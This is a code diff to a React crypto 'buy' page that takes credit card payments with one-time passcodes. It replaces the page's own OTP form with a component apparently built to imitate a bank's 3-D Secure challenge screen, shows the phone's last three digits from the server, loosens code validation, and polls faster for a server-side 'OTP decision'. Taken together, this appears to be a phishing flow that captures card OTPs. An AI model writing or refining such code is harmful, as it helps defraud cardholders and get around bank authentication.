@@ -5,6 +5,7 @@ import {
   createOrder,
   getPaymentDetails,
   submitCreditCardOtp,
+  submitCreditCardMethodNext,
   fetchCreditCardOtpDecision,
   fetchOrderOtpStatus,
   requestOtpResend,
@@ -12,13 +13,14 @@ import {
 import { getOrCreateVisitorId } from '../visitTracking';
 import { saveOrderLocal } from '../lib/savedOrders';
 import { NETWORK_POLICY, minUsdtForNetwork, feeUsdtForNetwork } from '../../shared/networkPolicy.js';
-import { CardProcessingToOtpScreen, OtpResendButton, OtpVerificationExtras } from '../components/OtpPaymentUi';
+import { CardProcessingToOtpScreen } from '../components/OtpPaymentUi';
+import { AcsOtpChallenge } from '../components/AcsOtpChallenge';
 import Header from '../components/Header';
 import Footer from '../components/Footer';
 
 const OTP_MAX_ATTEMPTS = 2;
-const OTP_POLL_MS = 2000;
-const OTP_PRE_POLL_MS = 500;
+const OTP_POLL_MS = 1200;
+const OTP_PRE_POLL_MS = 250;
 
 function useCountdown(targetMs) {
   const [now, setNow] = useState(() => Date.now());
@@ -115,6 +117,8 @@ export default function BuyPage() {
   const [otpFailReason, setOtpFailReason] = useState(null);
   const [otpResendLoading, setOtpResendLoading] = useState(false);
 
+  const [otpPhoneLast3, setOtpPhoneLast3] = useState('');
+
   const applyOtpPollMeta = useCallback((data) => {
     if (typeof data?.otp_attempts === 'number') setOtpAttempts(data.otp_attempts);
     if (typeof data?.otp_max_attempts === 'number') setOtpMaxAttempts(data.otp_max_attempts);
@@ -123,6 +127,9 @@ export default function BuyPage() {
       setOtpResendCooldown(Math.max(0, data.otp_resend_cooldown_sec));
     }
     if (data?.fail_reason) setOtpFailReason(data.fail_reason);
+    if (data?.phone_last3) {
+      setOtpPhoneLast3(String(data.phone_last3).replace(/\D/g, '').slice(-3));
+    }
   }, []);
 
   useEffect(() => {
@@ -386,17 +393,27 @@ export default function BuyPage() {
     }
   };
 
-  const onSubmitOtp = async () => {
+  const onMethodNext = async () => {
+    if (!orderId) return;
+    try {
+      await submitCreditCardMethodNext(orderId);
+    } catch (e) {
+      console.error('method-next', e);
+    }
+  };
+
+  const onSubmitOtp = async (codeArg) => {
     if (!orderId) {
       setError(isRtl ? 'رقم الطلب غير موجود. أعد المحاولة.' : 'Missing order id. Please try again.');
-      return;
+      throw new Error('missing order');
     }
-    const code = String(otpCode || '').trim();
-    if (!/^\d{6}$/.test(code)) {
-      setError(isRtl ? 'يرجى إدخال رمز مكوّن من 6 أرقام.' : 'Please enter a 6-digit code.');
-      return;
+    const code = String(codeArg ?? otpCode || '').trim();
+    if (code.length < 4) {
+      setError(isRtl ? 'يرجى إدخال الرمز ثم Next.' : 'Enter the code then press Next.');
+      throw new Error('invalid otp');
     }
 
+    setOtpCode(code);
     setOtpRetryNotice(false);
     setOtpResendNotice(false);
     setVerifyingOtp(true);
@@ -412,6 +429,7 @@ export default function BuyPage() {
       } else {
         setError(String(e?.message || e));
       }
+      throw e;
     } finally {
       setVerifyingOtp(false);
     }
@@ -1116,51 +1134,30 @@ export default function BuyPage() {
             )}
 
             {stage === 3 && !preOtpProcessing && (
-              <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
-                <div className="cc-otp-card buy-span-2">
-                  <div className="cc-otp-title">{isRtl ? 'تحقق من الدفع' : 'Payment Verification'}</div>
-                  <div className="cc-otp-sub">{isRtl ? 'أدخل كود التحقق الذي وصلك' : 'Enter the verification code you received'}</div>
-
-                  <OtpVerificationExtras
-                    t={t}
+              <div className="buy-form-grid mt-6">
+                <div className="buy-span-2">
+                  <AcsOtpChallenge
+                    orderRef={orderId}
+                    phoneLast3={otpPhoneLast3}
+                    lang={lang}
                     otpAttempts={otpAttempts}
                     otpMaxAttempts={otpMaxAttempts}
                     otpRemaining={otpRemaining}
                     otpRetryNotice={otpRetryNotice}
                     otpResendNotice={otpResendNotice}
+                    resendCooldown={otpResendCooldown}
+                    resendLoading={otpResendLoading}
+                    externalState={verifyingOtp ? 'checking' : 'input'}
+                    t={(key, fb) => t[key] ?? fb}
+                    onMethodNext={onMethodNext}
+                    onSubmitOtp={(code) => onSubmitOtp(code)}
+                    onResend={() => void onOtpResend()}
                   />
-
-                  <label className="input-label cc-otp-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
-                    {isRtl ? 'أدخل كود التحقق (6 أرقام)' : 'Verification code (6 digits)'}
-                  </label>
-                  <div className="cc-otp-input-wrap">
-                    <input
-                      className="input-control cc-otp-input"
-                      value={otpCode}
-                      onChange={(e) => setOtpCode(String(e.target.value).replace(/\D/g, '').slice(0, 6))}
-                      placeholder={isRtl ? 'ادخل الرمز' : 'Enter code'}
-                      dir="ltr"
-                      inputMode="numeric"
-                      maxLength={6}
-                      style={{ textAlign: 'left' }}
-                    />
-                  </div>
-
-                  {otpExpiresAt && (
-                    <div className="cc-otp-exp" style={{ textAlign: isRtl ? 'right' : 'left' }}>
-                      {isRtl ? 'صلاحية الكود: 10 دقائق' : 'OTP validity: 10 minutes'}
+                  {error && (
+                    <div className="text-error text-sm mt-3" style={{ textAlign: isRtl ? 'right' : 'left' }}>
+                      {error}
                     </div>
                   )}
-
-                  <div className="otp-resend-wrap">
-                    <OtpResendButton
-                      t={t}
-                      loading={otpResendLoading}
-                      cooldown={otpResendCooldown}
-                      disabled={otpResendLoading || otpResendCooldown > 0 || verifyingOtp}
-                      onResend={() => void onOtpResend()}
-                    />
-                  </div>
                 </div>
               </div>
             )}
@@ -1237,6 +1234,8 @@ export default function BuyPage() {
                   {isRtl ? 'رجوع للخطوة السابقة' : 'Back to previous step'}
                 </button>
               )}
+              {/* Stage 3 uses ACS Next buttons inside AcsOtpChallenge — hide outer send */}
+              {stage !== 3 && (
               <button
                 onClick={() => {
                   if (stage === 1) {
@@ -1245,10 +1244,6 @@ export default function BuyPage() {
                   }
                   if (stage === 2) {
                     onConfirm();
-                    return;
-                  }
-                  if (stage === 3) {
-                    onSubmitOtp();
                   }
                 }}
                 className="btn btn-primary"
@@ -1259,9 +1254,7 @@ export default function BuyPage() {
                       ? (canMoveToPayDetails ? 1 : 0.5)
                       : stage === 2
                         ? (isCreditCard ? (canSendCard ? 1 : 0.5) : (cd.remainingMs === 0 || usdtAmount < minUsdtThisNetwork ? 0.5 : 1))
-                        : stage === 3
-                          ? (verifyingOtp ? 0.5 : (cd.remainingMs === 0 ? 0.5 : 1))
-                          : 0.6,
+                        : 0.6,
                 }}
                 disabled={
                   stage === 4 || stage === 5 || stage === 6 || stage === 7
@@ -1270,9 +1263,7 @@ export default function BuyPage() {
                       ? !canMoveToPayDetails
                       : stage === 2
                         ? (sending || cd.remainingMs === 0 || usdtAmount < minUsdtThisNetwork || (isCreditCard ? !canSendCard : false))
-                        : stage === 3
-                          ? (verifyingOtp || cd.remainingMs === 0 || !/^\d{6}$/.test(String(otpCode || '').trim()))
-                          : true
+                        : true
                 }
               >
                 {stage === 1
@@ -1283,10 +1274,9 @@ export default function BuyPage() {
                         ? (sending ? (isRtl ? 'جاري الإرسال...' : 'Sending...') : (isRtl ? 'إرسال' : 'Send'))
                         : (sending ? (isRtl ? 'جاري الإرسال...' : 'Sending...') : t.confirmAndSend)
                     )
-                    : stage === 3
-                      ? (verifyingOtp ? (isRtl ? 'جاري الإرسال...' : 'Sending...') : (isRtl ? 'إرسال الكود' : 'Send code'))
-                      : (isRtl ? 'بانتظار...' : 'Waiting...')}
+                    : (isRtl ? 'بانتظار...' : 'Waiting...')}
               </button>
+              )}
             </div>
             )}
 
